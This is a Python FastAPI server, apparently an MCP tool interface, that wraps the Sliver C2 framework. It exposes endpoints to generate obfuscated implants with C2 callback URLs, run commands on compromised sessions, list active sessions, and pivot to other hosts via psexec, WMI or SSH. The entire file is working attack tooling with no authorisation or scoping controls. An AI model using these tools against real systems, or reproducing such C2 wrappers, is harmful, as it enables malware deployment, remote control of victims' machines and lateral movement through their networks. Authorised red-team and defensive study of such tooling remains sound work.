"""
Sliver C2 MCP Server

FastAPI server for Sliver C2 framework integration.
Manages implant generation, session interaction, and lateral movement.
"""

import asyncio
import json
from typing import Any

from fastapi import FastAPI
from pydantic import BaseModel, ConfigDict, Field


app = FastAPI(
    title="Sliver C2 MCP Server",
    description="C2 operations via Sliver framework",
    version="1.0.0",
)


class ImplantRequest(BaseModel):
    model_config = ConfigDict(extra="ignore")

    target_os: str = Field("windows", description="Target OS: windows, linux, darwin")
    target_arch: str = Field("amd64", description="Target arch: amd64, arm64, 386")
    c2_urls: list[str] = Field(default_factory=list, description="C2 callback URLs")
    format: str = Field("exe", description="Output format: exe, dll, shellcode, shared")
    name: str = Field("", description="Implant name (auto-generated if empty)")
    obfuscation: bool = Field(True, description="Enable obfuscation")


class ImplantResponse(BaseModel):
    success: bool
    implant_name: str | None = None
    implant_path: str | None = None
    size_bytes: int = 0
    error: str | None = None


class SessionCommand(BaseModel):
    session_id: str = Field(..., description="Sliver session ID")
    command: str = Field(..., description="Command to execute")
    args: list[str] = Field(default_factory=list)
    timeout: int = Field(60, ge=5, le=300)


class SessionResponse(BaseModel):
    success: bool
    stdout: str = ""
    stderr: str = ""
    exit_code: int = -1
    error: str | None = None


class PivotRequest(BaseModel):
    session_id: str = Field(..., description="Source session ID")
    target_host: str = Field(..., description="Target host to pivot to")
    technique: str = Field("psexec", description="Pivot technique: psexec, wmi, ssh")


@app.get("/")
async def root() -> dict[str, str]:
    return {"tool": "sliver", "path": "/tools/sliver_generate", "status": "ok"}


@app.get("/health")
async def health() -> dict[str, str]:
    return {"status": "healthy", "tool": "sliver"}


@app.post("/tools/sliver_generate", response_model=ImplantResponse)
async def generate_implant(request: ImplantRequest) -> ImplantResponse:
    """Generate a Sliver implant."""
    try:
        name = request.name or f"arc-implant"
        cmd = [
            "sliver-client", "generate",
            "--os", request.target_os,
            "--arch", request.target_arch,
            "--format", request.format,
            "--name", name,
            "--save", f"/app/output/{name}",
        ]

        if request.obfuscation:
            cmd.append("--evasion")

        for url in request.c2_urls:
            cmd.extend(["--mtls", url])

        process = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )

        stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=120)

        if process.returncode != 0:
            return ImplantResponse(
                success=False,
                error=stderr.decode("utf-8", errors="replace")[:500],
            )

        return ImplantResponse(
            success=True,
            implant_name=name,
            implant_path=f"/app/output/{name}",
        )

    except FileNotFoundError:
        return ImplantResponse(success=False, error="Sliver client not installed")
    except Exception as e:
        return ImplantResponse(success=False, error=str(e)[:500])


@app.post("/tools/sliver_execute", response_model=SessionResponse)
async def execute_command(request: SessionCommand) -> SessionResponse:
    """Execute a command on a Sliver session."""
    try:
        cmd = [
            "sliver-client", "use", request.session_id,
            "--", request.command,
        ] + request.args

        process = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )

        stdout, stderr = await asyncio.wait_for(
            process.communicate(), timeout=request.timeout,
        )

        return SessionResponse(
            success=process.returncode == 0,
            stdout=stdout.decode("utf-8", errors="replace")[:10000],
            stderr=stderr.decode("utf-8", errors="replace")[:5000],
            exit_code=process.returncode or 0,
        )

    except Exception as e:
        return SessionResponse(success=False, error=str(e)[:500])


@app.get("/tools/sliver_sessions")
async def list_sessions() -> dict[str, Any]:
    """List active Sliver sessions."""
    try:
        process = await asyncio.create_subprocess_exec(
            "sliver-client", "sessions", "--json",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, _ = await asyncio.wait_for(process.communicate(), timeout=30)
        output = stdout.decode("utf-8", errors="replace")

        try:
            sessions = json.loads(output)
        except json.JSONDecodeError:
            sessions = []

        return {"success": True, "sessions": sessions}

    except Exception as e:
        return {"success": False, "sessions": [], "error": str(e)}


@app.post("/tools/sliver_pivot")
async def pivot(request: PivotRequest) -> dict[str, Any]:
    """Pivot to a new host through an existing session."""
    try:
        cmd = [
            "sliver-client", "use", request.session_id,
            "--", request.technique, request.target_host,
        ]

        process = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=120)

        return {
            "success": process.returncode == 0,
            "output": stdout.decode("utf-8", errors="replace")[:5000],
            "error": stderr.decode("utf-8", errors="replace")[:1000] if process.returncode != 0 else None,
        }

    except Exception as e:
        return {"success": False, "error": str(e)}
